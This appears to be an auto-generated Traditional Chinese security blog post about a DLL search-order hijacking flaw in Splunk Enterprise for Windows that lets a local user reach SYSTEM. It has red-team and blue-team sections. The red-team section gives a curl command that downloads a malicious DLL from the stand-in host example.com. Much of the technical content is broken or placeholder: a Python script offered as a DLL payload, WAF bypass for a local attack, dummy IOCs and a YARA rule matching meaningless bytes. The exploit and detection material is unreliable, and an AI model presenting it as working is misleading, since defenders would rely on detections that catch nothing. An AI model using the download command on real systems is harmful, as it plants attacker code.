---
layout: post
title:  "Splunk Enterprise Windows版存在DLL劫持漏洞，恐成SYSTEM提權跳板"
date:   2026-02-26 01:25:47 +0000
categories: [security]
severity: high
---

# 🔥 解析 Splunk Enterprise Windows 版本的 DLL 搜尋順序劫持風險
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS v3.1 分數 7.7)
> * **受駭指標**: 本機權限提升 (LPE)
> * **關鍵技術**: DLL 搜尋順序劫持、權限提升、Windows SYSTEM 等級權限

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Splunk Enterprise for Windows 在啟動服務時，會搜尋並載入特定的 DLL 檔案。然而，在某些版本中，DLL 搜尋順序的實現存在缺陷，允許攻擊者在系統磁碟上建立目錄並將惡意 DLL 檔案寫入其中。當 Splunk 服務啟動時，可能會不當地載入這些惡意 DLL 檔案，導致權限提升。
* **攻擊流程圖解**:
  1. 攻擊者在系統磁碟上建立目錄。
  2. 攻擊者將惡意 DLL 檔案寫入目錄。
  3. Splunk 服務啟動，搜尋並載入 DLL 檔案。
  4. 惡意 DLL 檔案被載入，導致權限提升。
* **受影響元件**: Splunk Enterprise for Windows 低於 10.2.0、10.0.3、9.4.8、9.3.9、9.2.12 的版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 低權限的 Windows 使用者權限，能夠在系統磁碟上建立目錄和寫入檔案。
* **Payload 建構邏輯**:

    ```
    
    python
    # 惡意 DLL 檔案範例
    import ctypes
    
    # 定義 DLL 主要入口點
    def DllMain():
        # 執行惡意代碼
        print("權限提升成功")
    
    # 匯出 DLL 主要入口點
    ctypes.windll.kernel32.SetDllDirectoryW.restype = None
    ctypes.windll.kernel32.SetDllDirectoryW.argtypes = [ctypes.c_wchar_p]
    ctypes.windll.kernel32.SetDllDirectoryW("C:\\\\path\\\\to\\\\malicious\\\\dll")
    
    ```
* **範例指令**: 使用 `curl` 下載惡意 DLL 檔案並將其寫入系統磁碟。

```

bash
curl -o C:\\\\path\\\\to\\\\malicious\\\\dll\\\\malicious.dll https://example.com/malicious.dll

```
* **繞過技術**: 可以使用 WAF 繞過技巧，例如使用 Base64 編碼的惡意 DLL 檔案。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | C:\\\\path\\\\to\\\\malicious\\\\dll\\\\malicious.dll |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_dll {
      meta:
        description = "偵測惡意 DLL 檔案"
        author = "Your Name"
      strings:
        $dll_main = { 60 00 00 00 00 00 00 00 }
      condition:
        $dll_main at 0
    }
    
    ```
* **緩解措施**: 升級 Splunk Enterprise for Windows 至 10.2.0、10.0.3、9.4.8、9.3.9、9.2.12 或更高版本。設定 Windows 服務啟動時不載入未簽名的 DLL 檔案。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **DLL (Dynamic Link Library)**: 動態連結庫，是 Windows 中的一種共享程式庫。
* **DLL 搜尋順序**: Windows 在載入 DLL 檔案時的搜尋順序，包括系統目錄、應用程式目錄等。
* **權限提升 (Privilege Escalation)**: 攻擊者利用漏洞或其他方法提升自己的權限，獲得更高的存取權限。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/174051)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1068/)


